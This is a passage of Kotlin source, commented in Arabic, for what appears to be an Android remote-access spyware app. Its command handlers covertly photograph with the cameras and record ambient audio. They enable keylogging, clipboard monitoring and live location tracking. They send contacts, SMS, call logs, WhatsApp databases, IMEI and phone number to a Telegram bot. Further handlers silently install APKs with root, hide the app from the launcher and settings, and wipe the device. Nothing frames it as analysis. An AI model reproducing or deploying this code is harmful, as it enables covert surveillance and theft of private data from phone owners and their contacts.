                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) { capturePhoto(camera, cameraManager, cameraId, file, frontCamera, context) }
                    override fun onDisconnected(c: CameraDevice) { c.close() }
                    override fun onError(c: CameraDevice, error: Int) { c.close() }
                }, Handler(Looper.getMainLooper()))
            } catch (e: Exception) {
                Log.e(TAG, "خطأ: ${e.message}")
                TelegramDirectClient.sendMessage("❌ خطأ: ${e.message}", "HTML")
            }
        }
        return """{"ok":true,"direct":true,"message":"جاري التقاط الصورة..."}"""
    }

    private fun capturePhoto(camera: CameraDevice, cm: CameraManager, cameraId: String, file: File, frontCamera: Boolean, context: Context) {
        try {
            val chars = cm.getCameraCharacteristics(cameraId)
            val map = chars.get(android.hardware.camera2.CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!
            val sizes = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
            val largest = if (sizes.isNotEmpty()) sizes.maxByOrNull { it.width * it.height }!! else sizes[0]
            val reader = android.media.ImageReader.newInstance(largest.width, largest.height, android.graphics.ImageFormat.JPEG, 1)
            val builder = camera.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE)
            builder.addTarget(reader.surface)
            reader.setOnImageAvailableListener({ r ->
                val image = r.acquireLatestImage()
                if (image != null) {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.capacity())
                    buffer.get(bytes)
                    FileOutputStream(file).use { it.write(bytes) }
                    image.close(); r.close(); camera.close()
                    scope.launch {
                        val fileBytes = file.readBytes()
                        TelegramDirectClient.sendPhoto(fileBytes, if (frontCamera) "📷 كاميرا أمامية" else "📷 كاميرا خلفية")
                    }
                }
            }, Handler(Looper.getMainLooper()))
            camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    builder.set(android.hardware.camera2.CaptureRequest.CONTROL_MODE, android.hardware.camera2.CaptureRequest.CONTROL_MODE_AUTO)
                    session.capture(builder.build(), object : CameraCaptureSession.CaptureCallback() {}, Handler(Looper.getMainLooper()))
                }
                override fun onConfigureFailed(session: CameraCaptureSession) { camera.close() }
            }, Handler(Looper.getMainLooper()))
        } catch (e: Exception) { camera.close() }
    }

    private class CompareSizesByArea : Comparator<android.util.Size> {
        override fun compare(lhs: android.util.Size, rhs: android.util.Size): Int {
            return java.lang.Long.signum(lhs.width.toLong() * lhs.height - rhs.width.toLong() * rhs.height)
        }
    }

    // ========== تسجيل الصوت ==========
    @SuppressLint("MissingPermission")
    private fun startAudioRecording(context: Context, params: JSONObject): String {
        val duration = params.optInt("duration", 60)
        return try {
            if (isRecording) return """{"ok":false,"message":"التسجيل قيد التشغيل بالفعل"}"""
            isRecording = true

            val file = File(context.getExternalFilesDir(null), "audio_recording_${System.currentTimeMillis()}.3gp")
            audioRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }

            scope.launch {
                delay(duration * 1000L)
                if (isRecording) stopAudioRecording(context)
            }

            scope.launch { TelegramDirectClient.sendMessage("🎙️ <b>بدء تسجيل الصوت المحيط</b>\n⏱️ المدة: $duration ثانية", "HTML") }
            """{"ok":true,"direct":true,"message":"جاري تسجيل الصوت لمدة $duration ثانية","file":"${file.absolutePath"}"""
        } catch (e: Exception) {
            isRecording = false
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun stopAudioRecording(context: Context): String {
        return try {
            audioRecorder?.apply {
                try {
                    stop()
                    release()
                    scope.launch { TelegramDirectClient.sendMessage("✅ تم إيقاف تسجيل الصوت", "HTML") }
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في إيقاف التسجيل: ${e.message}")
                }
            }
            audioRecorder = null
            isRecording = false

            val recordings = context.getExternalFilesDir(null)?.listFiles()?.filter {
                it.name.startsWith("audio_recording_") && it.exists()
            }
            recordings?.lastOrNull()?.let { file ->
                scope.launch { TelegramDirectClient.sendAudio(file.absolutePath, "🎙️ تسجيل صوت المحيط") }
            }

            """{"ok":true,"direct":true,"message":"تم إيقاف التسجيل"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    // ========== تسجيل الشاشة ==========
    private fun startScreenRecording(context: Context): String {
        scope.launch { TelegramDirectClient.sendMessage("❌ تسجيل الشاشة يتطلب إذن MediaProjection - غير متاح حالياً", "HTML") }
        return """{"ok":false,"direct":true,"error":"تسجيل الشاشة يتطلب إذن MediaProjection"}"""
    }

    private fun stopScreenRecording(context: Context): String {
        return """{"ok":false,"message":"لا يوجد تسجيل شاشة نشط"}"""
    }

    // ==================== التحكم بالإعدادات ====================

    private fun setVolume(context: Context, params: JSONObject): String {
        val streamType = params.optString("stream", "media")
        val level = params.optInt("level", 50)
        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val stream = when (streamType) {
            "alarm" -> AudioManager.STREAM_ALARM
            "music", "media" -> AudioManager.STREAM_MUSIC
            "ring" -> AudioManager.STREAM_RING
            "call" -> AudioManager.STREAM_VOICE_CALL
            "notification" -> AudioManager.STREAM_NOTIFICATION
            "system" -> AudioManager.STREAM_SYSTEM
            else -> AudioManager.STREAM_MUSIC
        }
        val maxVol = audioManager.getStreamMaxVolume(stream)
        val targetVol = (maxVol * level / 100).coerceIn(0, maxVol)
        audioManager.setStreamVolume(stream, targetVol, 0)
        return """{"ok":true,"message":"تم تعيين مستوى الصوت إلى $level%"}"""
    }

    private fun setBrightness(context: Context, params: JSONObject): String {
        val level = params.optInt("level", 50)
        return try {
            Settings.System.putInt(context.contentResolver, Settings.System.SCREEN_BRIGHTNESS, level)
            """{"ok":true,"message":"تم تعيين السطوع إلى $level%"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun setWallpaper(context: Context, params: JSONObject): String {
        val imageUrl = params.optString("url", "")
        val color = params.optString("color", "#000000")
        return try {
            val wallpaperManager = context.getSystemService(Context.WALLPAPER_SERVICE) as android.app.WallpaperManager
            if (imageUrl.isNotEmpty()) {
                // Download and set image wallpaper
                scope.launch {
                    try {
                        val url = java.net.URL(imageUrl)
                        val connection = url.openConnection() as java.net.HttpURLConnection
                        connection.connect()
                        val bitmap = android.graphics.BitmapFactory.decodeStream(connection.inputStream)
                        wallpaperManager.setBitmap(bitmap)
                        TelegramDirectClient.sendMessage("🖼️ تم تغيير الخلفية بنجاح", "HTML")
                    } catch (e: Exception) {
                        TelegramDirectClient.sendMessage("❌ فشل تحميل الصورة: ${e.message}", "HTML")
                    }
                }
                """{"ok":true,"direct":true,"message":"جاري تحميل وتعيين الخلفية..."}"""
            } else {
                // Set solid color wallpaper
                val bitmap = android.graphics.Bitmap.createBitmap(1080, 1920, android.graphics.Bitmap.Config.ARGB_8888)
                val canvas = android.graphics.Canvas(bitmap)
                canvas.drawColor(android.graphics.Color.parseColor(color))
                wallpaperManager.setBitmap(bitmap)
                """{"ok":true,"message":"تم تعيين خلفية اللون $color"}"""
            }
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun setWifi(context: Context, enable: Boolean): String {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            wifiManager.isWifiEnabled = enable
            val state = if (enable) "تشغيل" else "إيقاف"
            """{"ok":true,"message":"تم $state الواي فاي"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun setBluetooth(context: Context, enable: Boolean): String {
        val bluetoothAdapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter()
        return if (bluetoothAdapter != null) {
            if (enable) bluetoothAdapter.enable() else bluetoothAdapter.disable()
            val state = if (enable) "تشغيل" else "إيقاف"
            """{"ok":true,"message":"تم $state البلوتوث"}"""
        } else {
            """{"ok":false,"error":"البلوتوث غير متاح"}"""
        }
    }

    private fun setMobileData(context: Context, enable: Boolean): String {
        return try {
            val command = if (enable) "svc data enable" else "svc data disable"
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            val exitCode = process.waitFor()
            if (exitCode == 0) {
                val state = if (enable) "تشغيل" else "إيقاف"
                """{"ok":true,"message":"تم $state بيانات الجوال"}"""
            } else {
                // Fallback: try alternative method
                try {
                    val altCmd = if (enable) "settings put global mobile_data 1" else "settings put global mobile_data 0"
                    Runtime.getRuntime().exec(arrayOf("su", "-c", altCmd))
                    val state = if (enable) "تشغيل" else "إيقاف"
                    """{"ok":true,"message":"تم $state بيانات الجوال (طريقة بديلة)"}"""
                } catch (e2: Exception) {
                    """{"ok":false,"error":"يتطلب صلاحيات Root"}"""
                }
            }
        } catch (e: Exception) {
            """{"ok":false,"error":"يتطلب صلاحيات Root: ${e.message}"}"""
        }
    }

    private fun setHotspot(context: Context, enable: Boolean): String {
        return try {
            val command = if (enable) 
                "svc wifi enable-ap && ip link set wlan0 up" 
            else 
                "svc wifi disable-ap"
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            process.waitFor()
            val state = if (enable) "تشغيل" else "إيقاف"
            """{"ok":true,"message":"تم $state نقطة الاتصال"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"يتطلب صلاحيات Root: ${e.message}"}"""
        }
    }

    @SuppressLint("InlinedApi")
    private fun setAirplaneMode(context: Context, enable: Boolean): String {
        return try {
            Settings.Global.putInt(context.contentResolver, Settings.Global.AIRPLANE_MODE_ON, if (enable) 1 else 0)
            val intent = Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)
            intent.putExtra("state", enable)
            context.sendBroadcast(intent)
            val state = if (enable) "تشغيل" else "إيقاف"
            """{"ok":true,"message":"تم $state وضع الطيران"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun setTorch(context: Context, enable: Boolean): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                cameraManager.setTorchMode(cameraManager.cameraIdList[0], enable)
            }
            val state = if (enable) "تشغيل" else "إيقاف"
            """{"ok":true,"message":"تم $state الفلاش"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun playSound(context: Context, params: JSONObject): String {
        return try {
            val soundType = params.optString("type", "notification")
            val soundId = when (soundType) {
                "alarm" -> android.media.RingtoneManager.TYPE_ALARM
                "ringtone" -> android.media.RingtoneManager.TYPE_RINGTONE
                else -> android.media.RingtoneManager.TYPE_NOTIFICATION
            }
            val ringtone = android.media.RingtoneManager.getDefaultUri(soundId)
            val r = android.media.RingtoneManager.getRingtone(context, ringtone)
            r.play()
            scope.launch {
                kotlinx.coroutines.delay(3000)
                r.stop()
            }
            """{"ok":true,"message":"تم تشغيل الصوت"}"""
        } catch (e: Exception) {
            // Fallback: use notification sound via ToneGenerator
            try {
                val toneGen = android.media.ToneGenerator(android.media.AudioManager.STREAM_NOTIFICATION, 100)
                toneGen.startTone(android.media.ToneGenerator.TONE_PROP_BEEP)
                scope.launch {
                    kotlinx.coroutines.delay(1000)
                    toneGen.release()
                }
                """{"ok":true,"message":"تم تشغيل الصوت"}"""
            } catch (e2: Exception) {
                """{"ok":false,"error":"${e.message}"}"""
            }
        }
    }

    private fun speakText(context: Context, params: JSONObject): String {
        val text = params.optString("text", "اختبار")
        return try {
            var ttsRef: android.speech.tts.TextToSpeech? = null
            val tts = android.speech.tts.TextToSpeech(context) { status ->
                if (status == android.speech.tts.TextToSpeech.SUCCESS) {
                    ttsRef?.speak(text, android.speech.tts.TextToSpeech.QUEUE_FLUSH, null, "abuzahra")
                }
            }
            ttsRef = tts
            """{"ok":true,"message":"جاري النطق: $text"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    // ==================== التحكم بالتطبيقات ====================

    private fun launchApp(context: Context, params: JSONObject): String {
        val packageName = params.optString("package", "")
        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
        return try {
            val intent = context.packageManager.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                context.startActivity(intent)
                """{"ok":true,"message":"تم فتح التطبيق: $packageName"}"""
            } else {
                """{"ok":false,"error":"التطبيق غير موجود"}"""
            }
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun openApp(context: Context, params: JSONObject): String = launchApp(context, params)

    private fun closeApp(context: Context, params: JSONObject): String {
        val packageName = params.optString("package", "")
        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                am.appTasks.filter { it.taskInfo.topActivity?.packageName == packageName }.forEach { it.finishAndRemoveTask() }
            }
            """{"ok":true,"message":"تم إغلاق التطبيق: $packageName"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun installApp(context: Context, params: JSONObject): String {
        val url = params.optString("url", "")
        val pkgPath = params.optString("path", "")
        return if (url.isNotEmpty()) {
            try {
                scope.launch {
                    TelegramDirectClient.sendMessage("📥 جاري تحميل وتثبيت التطبيق...", "HTML")
                    // Download APK
                    val file = File(context.getExternalFilesDir(null), "install_${System.currentTimeMillis()}.apk")
                    java.net.URL(url).openStream().use { input ->
                        file.outputStream().use { output -> input.copyTo(output) }
                    }
                    // Install with root
                    val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "pm install -r ${file.absolutePath}"))
                    val output = process.inputStream.bufferedReader().readText()
                    val exitCode = process.waitFor()
                    TelegramDirectClient.sendMessage(
                        if (exitCode == 0) "✅ تم تثبيت التطبيق بنجاح" else "❌ فشل التثبيت: $output",
                        "HTML"
                    )
                    file.delete()
                }
                """{"ok":true,"direct":true,"message":"جاري التثبيت..."}"""
            } catch (e: Exception) {
                """{"ok":false,"error":"${e.message}"}"""
            }
        } else if (pkgPath.isNotEmpty()) {
            try {
                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "pm install -r $pkgPath"))
                """{"ok":true,"message":"جاري التثبيت..."}"""
            } catch (e: Exception) {
                """{"ok":false,"error":"${e.message}"}"""
            }
        } else {
            """{"ok":false,"error":"رابط APK أو مسار الملف مطلوب"}"""
        }
    }

    private fun uninstallApp(context: Context, params: JSONObject): String {
        val packageName = params.optString("package", "")
        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
        return try {
            val intent = Intent(Intent.ACTION_DELETE, Uri.parse("package:$packageName"))
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
            """{"ok":true,"message":"تم فتح نافذة إلغاء التثبيت"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun blockApp(context: Context, params: JSONObject): String {
        val packageName = params.optString("package", "")
        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
        SharedPrefsManager.addBlockedApp(context, packageName)
        return """{"ok":true,"message":"تم حظر التطبيق: $packageName"}"""
    }

    private fun unblockApp(context: Context, params: JSONObject): String {
        val packageName = params.optString("package", "")
        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
        SharedPrefsManager.removeBlockedApp(context, packageName)
        return """{"ok":true,"message":"تم إلغاء حظر التطبيق: $packageName"}"""
    }

    private fun clearAppData(context: Context, params: JSONObject): String {
        val packageName = params.optString("package", "")
        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                am.clearApplicationUserData()
            }
            """{"ok":true,"message":"تم مسح بيانات التطبيق"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun forceStopApp(context: Context, params: JSONObject): String {
        val packageName = params.optString("package", "")
        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            am.killBackgroundProcesses(packageName)
            """{"ok":true,"message":"تم إيقاف التطبيق بالقوة: $packageName"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    // ==================== إدارة الملفات ====================

    @SuppressLint("Range")
    private fun listFiles(context: Context, params: JSONObject): String {
        val path = params.optString("path", Environment.getExternalStorageDirectory().absolutePath)
        val folder = File(path)
        if (!folder.exists() || !folder.isDirectory) {
            return """{"ok":false,"error":"المجلد غير موجود"}"""
        }
        val files = JSONArray()
        folder.listFiles()?.sortedByDescending { it.lastModified() }?.take(100)?.forEach { f ->
            val file = JSONObject()
            file.put("name", f.name)
            file.put("path", f.absolutePath)
            file.put("size", f.length())
            file.put("isDirectory", f.isDirectory)
            file.put("lastModified", f.lastModified())
            files.put(file)
        }
        return """{"ok":true,"count":${files.length()},"path":"$path","data":$files}"""
    }

    private fun getFile(context: Context, params: JSONObject): String {
        val path = params.optString("path", "")
        if (path.isEmpty()) return """{"ok":false,"error":"مسار الملف مطلوب"}"""
        val file = File(path)
        if (!file.exists()) return """{"ok":false,"error":"الملف غير موجود"}"""
        scope.launch {
            TelegramDirectClient.sendDocument(file.absolutePath, file.name)
        }
        return """{"ok":true,"direct":true,"message":"جاري إرسال الملف: ${file.name}","size":${file.length()}}"""
    }

    private fun deleteFile(context: Context, params: JSONObject): String {
        val path = params.optString("path", "")
        if (path.isEmpty()) return """{"ok":false,"error":"مسار الملف مطلوب"}"""
        val file = File(path)
        return if (file.exists() && file.delete()) {
            """{"ok":true,"message":"تم حذف الملف"}"""
        } else {
            """{"ok":false,"error":"فشل حذف الملف"}"""
        }
    }

    private fun sendBackup(context: Context, type: String): String {
        scope.launch {
            when (type) {
                "contacts" -> {
                    val data = getContacts(context)
                    val file = File(context.getExternalFilesDir(null), "backup_contacts_${System.currentTimeMillis()}.json")
                    file.writeText(data)
                    TelegramDirectClient.sendDocument(file.absolutePath, "📇 نسخة احتياطية - جهات الاتصال")
                }
                "sms" -> {
                    val data = getSMS(context)
                    val file = File(context.getExternalFilesDir(null), "backup_sms_${System.currentTimeMillis()}.json")
                    file.writeText(data)
                    TelegramDirectClient.sendDocument(file.absolutePath, "📲 نسخة احتياطية - الرسائل")
                }
                "calls" -> {
                    val data = getCalls(context)
                    val file = File(context.getExternalFilesDir(null), "backup_calls_${System.currentTimeMillis()}.json")
                    file.writeText(data)
                    TelegramDirectClient.sendDocument(file.absolutePath, "📞 نسخة احتياطية - المكالمات")
                }
                "whatsapp" -> {
                    val data = getWhatsAppData(context)
                    TelegramDirectClient.sendMessage("📂 جاري جمع ملفات واتساب...", "HTML")
                    val waPath = Environment.getExternalStorageDirectory().absolutePath + "/WhatsApp/Databases"
                    val waFolder = File(waPath)
                    if (waFolder.exists()) {
                        waFolder.listFiles()?.sortedByDescending { it.lastModified() }?.firstOrNull()?.let { f ->
                            TelegramDirectClient.sendDocument(f.absolutePath, "💬 نسخة احتياطية واتساب - ${f.name}")
                        }
                    } else {
                        TelegramDirectClient.sendMessage("❌ لا يوجد مجلد قواعد بيانات واتساب", "HTML")
                    }
                }
                "all" -> {
                    TelegramDirectClient.sendMessage("📦 <b>جاري جمع النسخة الاحتياطية الشاملة...</b>", "HTML")
                    delay(1000)

                    val backupDir = File(context.getExternalFilesDir(null), "full_backup_${System.currentTimeMillis()}")
                    backupDir.mkdirs()

                    // جهات الاتصال
                    val contactsFile = File(backupDir, "contacts.json")
                    contactsFile.writeText(getContacts(context))

                    // الرسائل
                    val smsFile = File(backupDir, "sms.json")
                    smsFile.writeText(getSMS(context))

                    // المكالمات
                    val callsFile = File(backupDir, "calls.json")
                    callsFile.writeText(getCalls(context))

                    // المعلومات
                    val infoFile = File(backupDir, "device_info.json")
                    infoFile.writeText(getDeviceInfo(context))

                    // إنشاء ملف ZIP
                    val zipFile = File(context.getExternalFilesDir(null), "full_backup_${System.currentTimeMillis()}.zip")
                    zipFiles(backupDir, zipFile)

                    TelegramDirectClient.sendDocument(zipFile.absolutePath, "📦 النسخة الاحتياطية الشاملة")

                    // تنظيف
                    backupDir.deleteRecursively()
                }
            }
        }
        return """{"ok":true,"direct":true,"message":"جاري إرسال النسخة الاحتياطية"}"""
    }

    private fun zipFiles(sourceDir: File, zipFile: File) {
        try {
            java.util.zip.ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                sourceDir.walkTopDown().forEach { file ->
                    if (file.isFile && file != zipFile) {
                        val entryName = file.relativeTo(sourceDir).path
                        zos.putNextEntry(java.util.zip.ZipEntry(entryName))
                        file.inputStream().use { input -> input.copyTo(zos) }
                        zos.closeEntry()
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في ضغط الملفات: ${e.message}")
        }
    }

    // ==================== المراقبة ====================

    private fun startKeylogger(context: Context): String {
        SharedPrefsManager.setKeyloggerEnabled(context, true)
        scope.launch { TelegramDirectClient.sendMessage("⌨️ <b>تم تفعيل تسجيل المفاتيح</b>", "HTML") }
        return """{"ok":true,"direct":true,"message":"تم تفعيل تسجيل المفاتيح"}"""
    }

    private fun stopKeylogger(context: Context): String {
        SharedPrefsManager.setKeyloggerEnabled(context, false)
        return """{"ok":true,"message":"تم إيقاف تسجيل المفاتيح"}"""
    }

    private fun getKeyloggerData(context: Context): String {
        return try {
            val keys = AppDatabase.getKeylogs(context)
            val data = JSONArray()
            for (k in keys) {
                val entry = JSONObject()
                entry.put("text", k["text"] ?: "")
                entry.put("app", k["app_package"] ?: "")
                entry.put("time", k["timestamp"] ?: "")
                data.put(entry)
            }
            val file = File(context.getExternalFilesDir(null), "keylogger_data_${System.currentTimeMillis()}.json")
            file.writeText(data.toString())
            scope.launch { TelegramDirectClient.sendDocument(file.absolutePath, "⌨️ بيانات تسجيل المفاتيح") }
            """{"ok":true,"direct":true,"count":${data.length()}}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun startClipboardMonitor(context: Context): String {
        SharedPrefsManager.setClipboardMonitorEnabled(context, true)
        return """{"ok":true,"message":"تم تفعيل مراقب الحافظة"}"""
    }

    private fun stopClipboardMonitor(context: Context): String {
        SharedPrefsManager.setClipboardMonitorEnabled(context, false)
        return """{"ok":true,"message":"تم إيقاف مراقب الحافظة"}"""
    }

    private fun startLiveLocation(context: Context): String {
        SharedPrefsManager.setLocationTrackingEnabled(context, true)
        scope.launch { TelegramDirectClient.sendMessage("🗺️ <b>تم تفعيل التتبع المباشر</b>\n📍 سيتم إرسال الموقع كل دقيقة", "HTML") }
        return """{"ok":true,"direct":true,"message":"تم تفعيل التتبع المباشر"}"""
    }

    private fun stopLiveLocation(context: Context): String {
        SharedPrefsManager.setLocationTrackingEnabled(context, false)
        scope.launch { TelegramDirectClient.sendMessage("⏹️ تم إيقاف التتبع المباشر", "HTML") }
        return """{"ok":true,"direct":true,"message":"تم إيقاف التتبع المباشر"}"""
    }

    // ==================== الأمان ====================

    private fun setAppVisibility(context: Context, visible: Boolean): String {
        val pm = context.packageManager
        val packageName = context.packageName
        return try {
            // 1. Hide/show launcher icon
            val aliasName = ComponentName(context, "$packageName.LauncherAlias")
            if (visible) {
                pm.setComponentEnabledSetting(aliasName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
            } else {
                pm.setComponentEnabledSetting(aliasName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            }
            
            // 2. With root: hide from Settings > Apps
            if (!visible) {
                try {
                    Runtime.getRuntime().exec(arrayOf("su", "-c", "pm disable-user --user 0 $packageName"))
                    // Re-enable the app itself but keep it hidden
                    Runtime.getRuntime().exec(arrayOf("su", "-c", "pm enable $packageName"))
                    // Disable the launcher alias
                    Runtime.getRuntime().exec(arrayOf("su", "-c", "pm disable-user --user 0 ${packageName}.LauncherAlias"))
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في الإخفاء المتقدم: ${e.message}")
                }
            } else {
                try {
                    Runtime.getRuntime().exec(arrayOf("su", "-c", "pm enable ${packageName}.LauncherAlias"))
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في إظهار التطبيق: ${e.message}")
                }
            }
            
            SharedPrefsManager.setAppHidden(context, !visible)
            val state = if (visible) "إظهار" else "إخفاء"
            scope.launch { TelegramDirectClient.sendMessage("👁️ تم $state التطبيق\n\nللإظهار: اتصل بالرمز *#*#7890#*#*", "HTML") }
            """{"ok":true,"direct":true,"message":"تم $state التطبيق"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun changePasscode(context: Context, params: JSONObject): String {
        val code = params.optString("code", "7890")
        SharedPrefsManager.setAdminPasscode(context, code)
        return """{"ok":true,"message":"تم تغيير الرمز السري إلى: $code"}"""
    }

    private fun wipeData(context: Context): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(context, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(componentName)) {
                dpm.wipeData(0)
                """{"ok":true,"message":"جاري مسح البيانات"}"""
            } else {
                """{"ok":false,"error":"مسؤول الجهاز غير مفعّل"}"""
            }
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun factoryReset(context: Context): String {
        return wipeData(context)
    }

    // ==================== المنفعة ====================

    private fun ping(context: Context): String {
        val info = JSONObject()
        info.put("model", Build.MODEL)
        info.put("brand", Build.BRAND)
        info.put("android", Build.VERSION.RELEASE)
        info.put("sdk", Build.VERSION.SDK_INT)
        info.put("battery", getBatteryLevel(context))
        info.put("time", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date()))
        scope.launch {
            TelegramDirectClient.sendMessage(
                "📡 <b>الجهاز متصل!</b>\n\n" +
                "📱 ${Build.MODEL}\n" +
                "🤖 Android ${Build.VERSION.RELEASE}\n" +
                "🔋 البطارية: ${getBatteryLevel(context)}%\n" +
                "🕐 ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())}",
                "HTML"
            )
        }
        return """{"ok":true,"direct":true,"device":$info}"""
    }

    fun getDeviceInfo(context: Context): String {
        return try {
            val info = JSONObject()
            info.put("model", Build.MODEL)
            info.put("brand", Build.BRAND)
            info.put("manufacturer", Build.MANUFACTURER)
            info.put("device", Build.DEVICE)
            info.put("product", Build.PRODUCT)
            info.put("hardware", Build.HARDWARE)
            info.put("android_version", Build.VERSION.RELEASE)
            info.put("sdk", Build.VERSION.SDK_INT)
            info.put("security_patch", Build.VERSION.SECURITY_PATCH)
            info.put("display", "${Build.DISPLAY}")
            info.put("fingerprint", Build.FINGERPRINT)
            info.put("serial", if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) Build.SERIAL else "N/A (requires permission)")
            // Check root
            var hasRoot = false
            try {
                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
                val output = process.inputStream.bufferedReader().readText()
                hasRoot = output.contains("uid=0")
            } catch (e: Exception) {}
            info.put("root", hasRoot)
            // Screen info
            val dm = context.getSystemService(Context.DISPLAY_SERVICE) as android.hardware.display.DisplayManager
            val display = dm.displays[0]
            val metrics = android.util.DisplayMetrics()
            display.getRealMetrics(metrics)
            info.put("screen_width", metrics.widthPixels)
            info.put("screen_height", metrics.heightPixels)
            info.put("screen_density", metrics.density)
            // Battery
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            info.put("battery", bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY))
            // Additional info
            info.put("total_storage", getTotalStorage(context))
            info.put("free_storage", getFreeStorage(context))
            info.put("imei", getIMEI(context))
            info.put("phone_number", getPhoneNumber(context))
            info.put("device_id", SharedPrefsManager.getDeviceId(context))
            
            scope.launch {
                val sb = StringBuilder()
                sb.appendLine("ℹ️ <b>معلومات الجهاز</b>\n\n")
                sb.appendLine("📱 الموديل: ${info.getString("model")}")
                sb.appendLine("🏢 الشركة: ${info.getString("brand")}")
                sb.appendLine("🏭 المصنّع: ${info.getString("manufacturer")}")
                sb.appendLine("🤖 أندرويد: ${info.getString("android_version")} (API ${info.getString("sdk")})")
                sb.appendLine("🔒 تصحيح الأمان: ${info.optString("security_patch", "N/A")}")
                sb.appendLine("📱 الشاشة: ${info.getInt("screen_width")}x${info.getInt("screen_height")}")
                sb.appendLine("🔋 البطارية: ${info.getInt("battery")}%")
                sb.appendLine("🧪 الروت: ${if (info.getBoolean("root")) "✅ نعم" else "❌ لا"}")
                TelegramDirectClient.sendLongMessage(sb.toString(), "HTML")
            }
            """{"ok":true,"direct":true,"data":$info}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun getBatteryInfo(context: Context): String {
        val battery = JSONObject()
        battery.put("level", getBatteryLevel(context))
        battery.put("charging", isCharging(context))
        battery.put("health", getBatteryHealth(context))
        battery.put("temperature", getBatteryTemperature(context))
        battery.put("voltage", getBatteryVoltage(context))
        battery.put("technology", getBatteryTechnology(context))
        return """{"ok":true,"battery":$battery}"""
    }

